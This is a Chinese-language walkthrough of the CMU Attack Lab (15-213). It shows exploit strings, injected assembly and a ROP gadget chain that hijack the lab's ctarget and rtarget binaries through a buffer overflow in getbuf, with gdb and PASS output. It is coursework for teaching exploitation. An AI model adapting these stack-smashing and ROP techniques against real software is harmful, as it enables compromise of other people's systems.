任务：实施缓冲区溢出攻击，向ctarget和rtarget输入exploit strings，以完成特殊操作。
利用HEX2RAW程序生成特殊的exploit strings 例子:
```
unix> ./hex2raw < ctarget.l2.txt | ./ctarget
Cookie: 0x1a7dd803
Type string:Touch2!: You called touch2(0x1a7dd803)
Valid solution for level 2 with target ctarget
PASSED: Sent exploit string to server to be validated.
NICE JOB!
```

首先  objdump -d ./ctarget >> ctarget.s 生成汇编代码。
ctarget的test函数在第900行。

## phase1：重定向
通过缓冲区溢出攻击，**重定向**test中的getbuf函数，使其返回时执行torch1函数。
阅读getbuf函数：
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
发现其栈指针减40字节，在调用gets函数向缓冲区输入数据，所以我们只需要输入48个字节，且后8个字节为torch1函数地址，即可完成重定向任务。查看torch1函数地址：
```
00000000004017c0 <touch1>:
```

所以可以输入以下字节到ctarget.l1.txt文件：
```
/* 进入getbuf函数后 减40字节后%rsp位置 */ 00 00 00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00  
/* getbuf 函数执行 retq语句之前 %rsp位置 */ c0 17 40 00 00 00 00 00 00 00  /* 小端法表示的torch1函数地址 */
```
后执行命令
```
[root@b07618077bfd attacklab]# ./hex2raw < ctarget.l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 00 00
```

## phase2：注入代码
利用缓冲区溢出执行攻击代码的方法：将栈空间的函数返回地址溢出覆盖为栈指针%rsp的值，然后从%rsp位置开始写入执行代码。
phase2任务为通过溢出执行torch2函数：
```
1 void touch2(unsigned val)
2 {
3 vlevel = 2; /* Part of validation protocol */
4 if (val == cookie) {
5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 validate(2);
7 } else {
8 printf("Misfire: You called touch2(0x%.8x)\n", val);
9 fail(2);
10 }
11 exit(0);
12 }
```
传入参数保存在寄存器%edi中，该值要等于cookie值。说明**注入代码**功能为修改%edi的值，并通过ret语句转到torch2函数地址。


gdb查找getbuf函数调用gets函数前%rsp的值：
```
(gdb) print /x $rsp
$1 = 0x5561dc78
```
注入代码语句：
```
movl    $0x59b997fa,%edi
pushq   $0x4017ec
retq
```
其中0x59b997fa为cookie值，0x4017ec为torch2函数起始地址。
将上面手写的汇编代码通过以下命令:
```
unix> gcc -c ctarget.l2.s
unix> objdump -d ctarget.l2.o > ctarget.l2.d
```
转换，其中部分ctarget.l2.d内容为：
```
0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	/* mov    $0x59b997fa,%edi */
   5:	68 ec 17 40 00       	/* pushq  $0x4017ec */
   a:	c3                   	/* retq */  
```

所以可以输入以下字节到ctarget.l2.txt文件：
```
/* getbuf函数 ret语句返回位置 */ bf fa 97 b9 59   /* mov    $0x59b997fa,%edi   */
68 ec 17 40 00          /* pushq  $0x4017ec */
c3                      /* retq */
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
/* getbuf 函数执行 retq语句之前 %rsp位置 */  78 dc 61 55 00 00 00 00  /* getbuf函数调用gets函数前%rsp的值 小端法表示 */
```
共48字节，最后一行为缓冲区溢出后返回地址，正好为%rsp，进而执行注入代码，之后可以转到torch2函数。
结果：
```
[root@b07618077bfd attacklab]# ./hex2raw < ctarget.l2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
```

## phase3 注入代码，且传参为字符串
类似phase2，不同点在于寄存器%edi的值要等于 字符串类型的cookie值 的初始地址。（参考torch3函数）
因此在溢出8字节作为返回地址后，额外溢出9字节保存cookie的字符串，但注意0x59b997fa要转成ascii码：
```
/* getbuf函数 ret语句返回位置 */ 48 8d 7c 24 00 /* lea    (%rsp),%rdi */
68 fa 18 40 00 /* pushq  $0x4018fa  当作torch3函数返回地址 */
c3             /* retq */
00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00  
/* getbuf 函数执行 retq语句之前 %rsp位置 */  78 dc 61 55 00 00 00 00        /* getbuf函数调用gets函数前%rsp的值 小端法表示 作为溢出返回地址 */
/* getbuf 函数执行 retq语句之后 %rsp位置 */  35 39 62 39 39 37 66 61 00 /* 再溢出9字节保存cookie字符串 注意要转成ascii码，最后一字节为/0结束符 */
```
之所以额外溢出，而不是在已分配的栈中写入字符串，是为了防止当函数hexmatch 和 strncmp被调用后覆盖了getbuf已分配的内存。
当getbuf函数返回，执行注入代码时，%rsp加了48字节，刚好指向cookie字符串，所以将其写入寄存器%rdi中。
结果：
```
[root@b07618077bfd attacklab]# ./hex2raw < ctarget.l3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
```

## phase4 返回导向编程
通常程序使用栈地址随机化 以及 不给栈内存执行代码权限的方法，让注入代码攻击变的十分困难。
返回导向编程 (return-oriented programming (ROP)) 利用一种代码内现存的，称为gadget的代码段。

经过上述实验，我们已经知道ret语句对应机器代码c3，且该语句功能为：程序跳转到当前%rsp指向的地址处，再让%rsp指针加8字节。
gadget由一系列其它指令加ret(c3)作为结尾的指令组成。每个gadget都可以实现一个小功能。例子如下：
```
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```
其中48 89 c7 编码了指令 movq %rax, %rdi，所以该段代码包含了一个gadget，从地址0x400f18开始，功能为将寄存器%rax中的64位值复制到%rdi中。

phase4任务：在RTARGET上寻找gadgets重复phase2的任务。
为完成该任务，我们需要以下gadget：
```
  402b18:	41 5f                	pop    %r15
  402b1a:	c3                   	retq
```
查表知5f功能为 popq %rdi，所以从地址0x402b19开始的一个gadget功能为：
```
popq    %rdi
retq
```
popq %rdi 功能为将当前栈指针%rsp保存的地址指向的值存入 %rdi中，再将栈指针加8字节；

最终rtarget.l2.txt内容如下：
```
00 00 00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
/* getbuf 函数执行 retq语句之前 %rsp位置 */ 19 2b 40 00 00 00 00 00  /* gadget地址 功能为 popq %rdi */
/* getbuf 函数执行 retq语句之后 %rsp位置 */ fa 97 b9 59 00 00 00 00  /* 将小端法表示的cookie值存入%rdi */
/* popq会将栈指针+8 移动到该位置 */         ec 17 40 00 00 00 00 00  /* 之后gadget ret 语句 转入 touch2 函数 */
```

结果：
```
[root@b07618077bfd attacklab]# ./hex2raw < rtarget.l2.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
```

